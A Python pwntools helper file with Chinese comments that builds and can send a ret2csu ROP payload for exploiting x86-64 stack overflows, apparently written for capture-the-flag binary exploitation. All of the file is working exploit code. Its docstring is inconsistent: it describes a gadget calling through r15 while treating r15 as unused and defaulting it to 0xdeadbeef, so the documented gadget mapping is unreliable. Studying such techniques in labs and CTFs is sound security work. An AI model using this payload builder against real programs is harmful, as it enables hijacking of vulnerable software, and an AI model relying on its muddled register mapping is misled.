from pwn import *
import time

def loopcsu(csu_end=None, csu_start=None, r12=None, r13=None, r14=None, r15=0xdeadbeef, return_addr=None, padding=None, rbx=0, rbp=1, io=None, send_method='sendline'):
    """
    构造 Ret2CSU payload。
    
    Payload 结构:
    padding + csu_end + rbx + rbp + r12 + r13 + r14 + r15 + csu_start + 0xdeadbeef*7 + return_addr
    
    Gadget 1 (csu_end):
        pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
        
    Gadget 2 (csu_start):
        mov rdx, r14; mov rsi, r13; mov edi, r12d; call qword ptr [r15+rbx*8] 
        (注意：此处寄存器映射根据用户习惯进行了调整，请确保目标程序的 csu gadget 符合此映射，或者根据需要传递对应参数)
        常规 Glibc csu 映射通常为: rdx=r15, rsi=r14, edi=r13d, call=[r12]
        但本工具根据用户需求定义为: r12=edi, r13=rsi, r14=rdx, r15=unused/call?
        
    :param csu_end: (可选) Gadget 1 地址 (pop ...)
    :param csu_start: (可选) Gadget 2 地址 (mov ... call ...)
    :param r12: (可选) 参数 1 (EDI)
    :param r13: (可选) 参数 2 (RSI)
    :param r14: (可选) 参数 3 (RDX)
    :param r15: (可选) 无用寄存器 (默认 0xdeadbeef)
    :param return_addr: (可选) 利用链结束后的返回地址
    :param padding: (必须) 填充内容或长度 (int/bytes)
    :param rbx: (可选) RBX 寄存器值 (默认 0)
    :param rbp: (可选) RBP 寄存器值 (默认 1)
    :param io: (可选) pwntools io 对象，若提供则自动发送
    :param send_method: (可选) 发送 payload 的方法，'send' 或 'sendline'，默认为 'sendline'。
    :return: 构造好的 payload (bytes)，如果参数不足返回 None
    """
    
    missing_args = []
    if csu_end is None: missing_args.append('csu_end')
    if csu_start is None: missing_args.append('csu_start')
    if r12 is None: missing_args.append('r12')
    if r13 is None: missing_args.append('r13')
    if r14 is None: missing_args.append('r14')
    # r15 默认值为 0xdeadbeef，所以不再作为必选参数检查
    if return_addr is None: missing_args.append('return_addr')
    if padding is None: missing_args.append('padding')
    
    if missing_args:
        for arg in missing_args:
            print(f"[-] Missing argument: '{arg}'")
        return None
    
    # 处理 padding
    if isinstance(padding, int):
        payload = b'a' * padding
    elif isinstance(padding, bytes):
        payload = padding
    else:
        raise ValueError("Padding must be int or bytes")
        
    # Gadget 1: Pops
    payload += p64(csu_end)
    payload += p64(0)          # rsp + 8
    payload += p64(rbx)        # rbx -> 0
    payload += p64(rbp)        # rbp -> 1
    payload += p64(r12)        # r12 -> edi (arg1)
    payload += p64(r13)        # r13 -> rsi (arg2)
    payload += p64(r14)        # r14 -> rdx (arg3)
    payload += p64(r15)        # r15 -> 0xdeadbeef (unused/default)
    
    # Gadget 2: Movs & Call
    payload += p64(csu_start)
    
    # Padding to handle stack balance after gadget 2 loops back or returns
    # 通常 csu_start 执行完后会走到 csu_end 再次 pop 7 次 (6 regs + 1 padding for ret)
    # 或者直接 add rsp, 0x38; ret
    payload += p64(0xdeadbeef) * 7
    
    # Final Return Address
    payload += p64(return_addr)
    
    if io:
        if send_method == 'send':
            io.send(payload)
        elif send_method == 'sendline':
            io.sendline(payload)
        else:
            raise ValueError("send_method must be 'send' or 'sendline'")
            
        time.sleep(0.1)
        
    return payload
